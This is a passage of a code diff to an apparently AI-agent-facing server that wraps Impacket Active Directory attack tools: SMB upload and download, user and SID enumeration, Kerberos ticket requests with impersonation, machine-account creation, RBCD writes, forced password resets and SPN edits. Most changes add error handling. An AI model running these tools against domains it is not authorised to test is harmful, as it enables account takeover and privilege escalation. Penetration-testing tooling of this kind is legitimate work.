                 return ToolResult(
                     success=False,
                     data={"target": target, "share": share, "remote_path": remote_path},
                     error=f"File download failed or empty",
-                    raw_output=sanitize_output(stdout_str + stderr_str),
+                    raw_output=sanitize_output(combined),
+                    error_class=error_class,
+                    retryable=retryable,
+                    suggestions=suggestions,
                 )
         except asyncio.TimeoutError:
             proc.kill()
@@ -1898,10 +3802,14 @@ class ImpacketServer(BaseMCPServer):
         except ToolError:
             raise
         except Exception as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            ec, rt, sg = self._classify_error(str(e))
+            return ToolResult(success=False, data={"target": target}, error=str(e),
+                              error_class=ec, retryable=rt, suggestions=sg)
         finally:
             if os.path.exists(local_path):
-                os.unlink(local_path)
+                os.remove(local_path)
+            if os.path.exists(download_dir):
+                shutil.rmtree(download_dir, ignore_errors=True)
 
     async def smb_put(
         self,
@@ -1917,12 +3825,13 @@ class ImpacketServer(BaseMCPServer):
         dc_ip: Optional[str] = None,
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Upload content to an SMB share."""
         self.logger.info(f"Uploading to {share}/{remote_path} on {target}")
 
-        target_str, extra_args = self._build_auth_args(
+        target_str, auth_extra = self._build_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
@@ -1932,10 +3841,25 @@ class ImpacketServer(BaseMCPServer):
         os.close(fd)
 
         cmd = ["impacket-smbclient"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(target_str)
 
+        # Normalize path: impacket-smbclient put takes ONE arg (local file path).
+        # It uploads to the current SMB directory with the same basename.
+        # We cd to the remote directory, then put the local file.
         smb_path = remote_path.replace("/", "\\")
+        if not smb_path.startswith("\\"):
+            smb_path = "\\" + smb_path
+
+        smb_dir = ntpath.dirname(smb_path)
+        smb_file = ntpath.basename(smb_path)
+
+        # Rename temp file to match desired remote filename (smbclient uses local basename)
+        upload_dir = tempfile.mkdtemp(prefix="smb_ul_")
+        upload_path = os.path.join(upload_dir, smb_file)
+        shutil.move(local_path, upload_path)
+        local_path = upload_path
 
         auth_env = self._get_auth_env() if kerberos else {}
         merged_env = {**os.environ, **auth_env} if auth_env else None
@@ -1948,7 +3872,9 @@ class ImpacketServer(BaseMCPServer):
                 stderr=asyncio.subprocess.PIPE,
             )
 
-            commands = f"use {share}\nput {local_path} {smb_path}\nexit\n"
+            # cd to remote directory, then put the local file
+            cd_cmd = f"cd {smb_dir}\n" if smb_dir else ""
+            commands = f"use {share}\n{cd_cmd}put {local_path}\nexit\n"
             stdout, stderr = await asyncio.wait_for(
                 proc.communicate(input=commands.encode()),
                 timeout=timeout,
@@ -1958,18 +3884,30 @@ class ImpacketServer(BaseMCPServer):
             stderr_str = stderr.decode("utf-8", errors="replace")
             combined = stdout_str + stderr_str
 
-            # Check for errors
-            has_error = "error" in combined.lower() and "STATUS_" in combined
+            # Check for errors using the shared helper
+            has_error = self._has_error_in_output(combined)
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if has_error:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "SMB upload failed"
+
             return ToolResult(
                 success=not has_error,
                 data={
                     "target": target,
                     "share": share,
                     "remote_path": remote_path,
-                    "size": len(content),
+                    "size": len(content) if not has_error else 0,
                 },
                 raw_output=sanitize_output(combined),
-                error=f"SMB upload may have failed: {combined}" if has_error else None,
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except asyncio.TimeoutError:
             proc.kill()
@@ -1981,7 +3919,9 @@ class ImpacketServer(BaseMCPServer):
             return ToolResult(success=False, data={"target": target}, error=str(e))
         finally:
             if os.path.exists(local_path):
-                os.unlink(local_path)
+                os.remove(local_path)
+            if os.path.exists(upload_dir):
+                shutil.rmtree(upload_dir, ignore_errors=True)
 
     # ── Enumeration Methods ──────────────────────────────────────────────
 
@@ -1996,38 +3936,61 @@ class ImpacketServer(BaseMCPServer):
         dc_ip: Optional[str] = None,
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
-        all: bool = False,
+        all: bool = True,
+        specific_user: Optional[str] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Enumerate AD users via LDAP."""
         self.logger.info(f"Enumerating AD users on {target}")
 
-        identity_str, extra_args = self._build_domain_auth_args(
+        identity_str, auth_extra = self._build_domain_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-GetADUsers"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         if all:
             cmd.append("-all")
+        if specific_user:
+            cmd.extend(["-user", specific_user])
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(identity_str)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             users = self._parse_ad_users(result.stdout, result.stderr)
+            combined = result.stdout + result.stderr
+
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or bool(users)) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "AD user enumeration failed"
 
             return ToolResult(
-                success=result.returncode == 0 or bool(users),
+                success=success,
                 data={
                     "target": target,
                     "users": users,
                     "user_count": len(users),
                 },
-                raw_output=sanitize_output(result.stdout + result.stderr),
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            ec, rt, sg = self._classify_error(str(e))
+            return ToolResult(success=False, data={"target": target}, error=str(e),
+                              error_class=ec, retryable=rt, suggestions=sg)
 
     async def lookupsid(
         self,
@@ -2041,35 +4004,56 @@ class ImpacketServer(BaseMCPServer):
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
         max_rid: int = 4000,
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """SID brute-force domain enumeration."""
         self.logger.info(f"LookupSID on {target} (max RID: {max_rid})")
 
-        target_str, extra_args = self._build_auth_args(
+        target_str, auth_extra = self._build_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-lookupsid"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(target_str)
         cmd.append(str(max_rid))  # maxRid is a positional argument
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             parsed = self._parse_lookupsid_output(result.stdout, result.stderr)
+            combined = result.stdout + result.stderr
+
+            # Detect errors even when returncode is 0
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or parsed["total"] > 0) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "SID lookup failed"
 
             return ToolResult(
-                success=result.returncode == 0 or parsed["total"] > 0,
+                success=success,
                 data={
                     "target": target,
                     **parsed,
                 },
-                raw_output=sanitize_output(result.stdout + result.stderr),
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            ec, rt, sg = self._classify_error(str(e))
+            return ToolResult(success=False, data={"target": target}, error=str(e),
+                              error_class=ec, retryable=rt, suggestions=sg)
 
     # ── Kerberos Methods ─────────────────────────────────────────────────
 
@@ -2084,6 +4068,7 @@ class ImpacketServer(BaseMCPServer):
         dc_ip: Optional[str] = None,
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 60,
     ) -> ToolResult:
         """Request a Kerberos TGT and save ccache file."""
@@ -2094,17 +4079,18 @@ class ImpacketServer(BaseMCPServer):
         if domain and effective_dc:
             self._ensure_krb5_conf(domain, effective_dc)
 
-        identity_str, extra_args = self._build_domain_auth_args(
+        identity_str, auth_extra = self._build_domain_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-getTGT"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(identity_str)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             combined = result.stdout + result.stderr
 
             # Find the generated ccache file
@@ -2121,8 +4107,20 @@ class ImpacketServer(BaseMCPServer):
             saved_path = self._tickets.get(principal)
             ccache_exists = bool(saved_path) or (ccache_path and os.path.exists(ccache_path))
 
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or ccache_exists) and not has_error
+
+            # Classify errors when not successful
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "TGT request failed"
+
             return ToolResult(
-                success=result.returncode == 0 or ccache_exists,
+                success=success,
                 data={
                     "target": target,
                     "username": username,
@@ -2132,9 +4130,19 @@ class ImpacketServer(BaseMCPServer):
                     "ccache_exists": ccache_exists,
                 },
                 raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            error_class, retryable, suggestions = self._classify_error(str(e))
+            return ToolResult(
+                success=False, data={"target": target}, error=str(e),
+                error_class=error_class or ("timeout" if "timed out" in str(e).lower() else "unknown"),
+                retryable="timed out" in str(e).lower(),
+                suggestions=suggestions or (["Increase timeout or check network connectivity"] if "timed out" in str(e).lower() else []),
+            )
 
     async def get_st(
         self,
@@ -2155,6 +4163,7 @@ class ImpacketServer(BaseMCPServer):
         u2u: bool = False,
         self_only: bool = False,
         dmsa: bool = False,
+        extra_args: Optional[str] = None,
         timeout: int = 60,
     ) -> ToolResult:
         """Request a service ticket via S4U2Self/S4U2Proxy for constrained delegation."""
@@ -2165,12 +4174,12 @@ class ImpacketServer(BaseMCPServer):
         if domain and effective_dc:
             self._ensure_krb5_conf(domain, effective_dc)
 
-        identity_str, extra_args = self._build_domain_auth_args(
+        identity_str, auth_extra = self._build_domain_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-getST"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         cmd.extend(["-spn", spn])
         cmd.extend(["-impersonate", impersonate])
 
@@ -2187,11 +4196,12 @@ class ImpacketServer(BaseMCPServer):
         if dmsa:
             cmd.append("-dmsa")
 
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(identity_str)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             combined = result.stdout + result.stderr
 
             # Find the generated ccache file
@@ -2208,8 +4218,19 @@ class ImpacketServer(BaseMCPServer):
             ccache_exists = ccache_path is not None and os.path.exists(ccache_path)
             saved_path = self._tickets.get(f"{impersonate}@{spn}", ccache_path)
 
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or ccache_exists) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "ST request failed"
+
             return ToolResult(
-                success=result.returncode == 0 or ccache_exists,
+                success=success,
                 data={
                     "target": target,
                     "spn": spn,
@@ -2218,9 +4239,17 @@ class ImpacketServer(BaseMCPServer):
                     "ccache_exists": ccache_exists,
                 },
                 raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target, "spn": spn}, error=str(e))
+            error_class, retryable, suggestions = self._classify_error(str(e))
+            return ToolResult(
+                success=False, data={"target": target, "spn": spn}, error=str(e),
+                error_class=error_class, retryable=retryable, suggestions=suggestions,
+            )
 
     async def addcomputer(
         self,
@@ -2237,17 +4266,20 @@ class ImpacketServer(BaseMCPServer):
         computer_pass: Optional[str] = None,
         method: str = "SAMR",
         base_dn: Optional[str] = None,
+        no_add: bool = False,
+        delete: bool = False,
+        extra_args: Optional[str] = None,
         timeout: int = 60,
     ) -> ToolResult:
         """Create a machine account in Active Directory."""
         self.logger.info(f"Adding computer account via {method}")
 
-        identity_str, extra_args = self._build_domain_auth_args(
+        identity_str, auth_extra = self._build_domain_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-addcomputer"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         cmd.extend(["-method", method])
 
         if computer_name:
@@ -2256,12 +4288,17 @@ class ImpacketServer(BaseMCPServer):
             cmd.extend(["-computer-pass", computer_pass])
         if base_dn:
             cmd.extend(["-baseDN", base_dn])
+        if no_add:
+            cmd.append("-no-add")
+        if delete:
+            cmd.append("-delete")
 
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(identity_str)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             combined = result.stdout + result.stderr
 
             # Parse computer name and password from output
@@ -2274,7 +4311,16 @@ class ImpacketServer(BaseMCPServer):
             if pass_match:
                 created_pass = pass_match.group(1)
 
-            success = result.returncode == 0 or "Successfully added" in combined
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or "Successfully added" in combined) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "Add computer failed"
 
             return ToolResult(
                 success=success,
@@ -2285,9 +4331,15 @@ class ImpacketServer(BaseMCPServer):
                     "method": method,
                 },
                 raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            ec, rt, sg = self._classify_error(str(e))
+            return ToolResult(success=False, data={"target": target}, error=str(e),
+                              error_class=ec, retryable=rt, suggestions=sg)
 
     async def find_delegation(
         self,
@@ -2300,22 +4352,33 @@ class ImpacketServer(BaseMCPServer):
         dc_ip: Optional[str] = None,
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
+        target_domain: Optional[str] = None,
+        filter_user: Optional[str] = None,
+        include_disabled: bool = False,
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Enumerate delegation settings across domain accounts."""
         self.logger.info(f"Finding delegation settings in {domain or target}")
 
-        identity_str, extra_args = self._build_domain_auth_args(
+        identity_str, auth_extra = self._build_domain_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["impacket-findDelegation"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
+        if target_domain:
+            cmd.extend(["-target-domain", target_domain])
+        if filter_user:
+            cmd.extend(["-user", filter_user])
+        if include_disabled:
+            cmd.append("-disabled")
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(identity_str)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             combined = result.stdout + result.stderr
 
             # Parse tabular output into structured data
@@ -2325,17 +4388,13 @@ class ImpacketServer(BaseMCPServer):
                 stripped = line.strip()
                 if not stripped:
                     continue
-                # Skip Impacket banner and info lines
                 if stripped.startswith("Impacket ") or stripped.startswith("[*]"):
                     continue
-                # Detect header row
                 if "AccountName" in stripped and "DelegationType" in stripped:
                     header_found = True
                     continue
-                # Skip separator lines (-----)
                 if stripped.startswith("---"):
                     continue
-                # Parse data rows (space-separated columns)
                 if header_found:
                     cols = stripped.split()
                     if len(cols) >= 4:
@@ -2346,18 +4405,34 @@ class ImpacketServer(BaseMCPServer):
                             "delegation_rights_to": " ".join(cols[3:]),
                         })
 
+            has_error = self._has_error_in_output(combined)
+            success = (result.returncode == 0 or len(delegations) > 0) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "Delegation enumeration failed"
+
             return ToolResult(
-                success=result.returncode == 0 or len(delegations) > 0,
+                success=success,
                 data={
                     "target": target,
                     "delegations": delegations,
                     "delegation_count": len(delegations),
                 },
                 raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
-
+            ec, rt, sg = self._classify_error(str(e))
+            return ToolResult(success=False, data={"target": target}, error=str(e),
+                              error_class=ec, retryable=rt, suggestions=sg)
 
     async def rbcd(
         self,
@@ -2374,17 +4449,18 @@ class ImpacketServer(BaseMCPServer):
         dc_ip: Optional[str] = None,
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 60,
     ) -> ToolResult:
         """Read, write, or clear Resource-Based Constrained Delegation."""
         self.logger.info(f"RBCD {action} on {delegate_to}")
 
-        identity_str, extra_args = self._build_domain_auth_args(
+        identity_str, auth_extra = self._build_domain_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["python3", "/opt/impacket-scripts/rbcd.py"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
 
         cmd.extend(["-delegate-to", delegate_to])
         cmd.extend(["-action", action])
@@ -2394,18 +4470,28 @@ class ImpacketServer(BaseMCPServer):
         if use_ldaps:
             cmd.append("-use-ldaps")
 
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(identity_str)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             combined = result.stdout + result.stderr
+            has_error = self._has_error_in_output(combined)
             success = (
                 result.returncode == 0
                 or "written successfully" in combined.lower()
                 or "attribute" in combined.lower()
                 or "accounts allowed" in combined.lower()
-            )
+            ) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "RBCD operation failed"
 
             return ToolResult(
                 success=success,
@@ -2416,9 +4502,15 @@ class ImpacketServer(BaseMCPServer):
                     "action": action,
                 },
                 raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            ec, rt, sg = self._classify_error(str(e))
+            return ToolResult(success=False, data={"target": target}, error=str(e),
+                              error_class=ec, retryable=rt, suggestions=sg)
 
     async def changepasswd(
         self,
@@ -2437,18 +4529,18 @@ class ImpacketServer(BaseMCPServer):
         dc_ip: Optional[str] = None,
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 60,
     ) -> ToolResult:
         """Change or force-reset a domain user's password."""
         self.logger.info(f"Password change on {target} via {protocol}")
 
-        # changepasswd.py uses target-based auth: [[domain/]username[:password]@]<hostname>
-        target_str, extra_args = self._build_auth_args(
+        target_str, auth_extra = self._build_auth_args(
             target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
         )
 
         cmd = ["python3", "/opt/impacket-scripts/changepasswd.py"]
-        cmd.extend(extra_args)
+        cmd.extend(auth_extra)
         cmd.extend(["-newpass", new_password])
         cmd.extend(["-protocol", protocol])
 
@@ -2461,18 +4553,31 @@ class ImpacketServer(BaseMCPServer):
         if althash:
             cmd.extend(["-althash", althash])
 
+        cmd.extend(self._parse_extra_args(extra_args))
         cmd.append(target_str)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             combined = result.stdout + result.stderr
+            has_error = self._has_error_in_output(combined)
             success = (
                 result.returncode == 0
                 or "changed successfully" in combined.lower()
                 or "password was changed" in combined.lower()
                 or "password was reset" in combined.lower()
-            )
+            ) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                # Bug 8 fix: classify "not allowed" as permission error
+                if "not allowed" in combined.lower() and error_class == "unknown":
+                    error_class = "permission"
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "Password change failed"
 
             return ToolResult(
                 success=success,
@@ -2482,9 +4587,15 @@ class ImpacketServer(BaseMCPServer):
                     "reset": reset,
                 },
                 raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            ec, rt, sg = self._classify_error(str(e))
+            return ToolResult(success=False, data={"target": target}, error=str(e),
+                              error_class=ec, retryable=rt, suggestions=sg)
 
     async def addspn(
         self,
@@ -2500,6 +4611,7 @@ class ImpacketServer(BaseMCPServer):
         dc_ip: Optional[str] = None,
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 60,
     ) -> ToolResult:
         """Add or remove a Service Principal Name on an AD account."""
@@ -2530,20 +4642,31 @@ class ImpacketServer(BaseMCPServer):
         if dc_ip:
             cmd.extend(["-dc-ip", dc_ip])
 
+        cmd.extend(self._parse_extra_args(extra_args))
+
         # Positional host arg: the LDAP server to connect to
         host = dc_ip or target
         cmd.append(host)
 
         try:
             auth_env = self._get_auth_env() if kerberos else {}
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             combined = result.stdout + result.stderr
+            has_error = self._has_error_in_output(combined)
             success = (
                 result.returncode == 0
                 or "added" in combined.lower()
                 or "removed" in combined.lower()
                 or "found" in combined.lower()
-            )
+            ) and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "SPN operation failed"
 
             return ToolResult(
                 success=success,
@@ -2554,9 +4677,15 @@ class ImpacketServer(BaseMCPServer):
                     "action": action,
                 },
                 raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except ToolError as e:
-            return ToolResult(success=False, data={"target": target}, error=str(e))
+            ec, rt, sg = self._classify_error(str(e))
+            return ToolResult(success=False, data={"target": target}, error=str(e),
+                              error_class=ec, retryable=rt, suggestions=sg)
 
 
 if __name__ == "__main__":
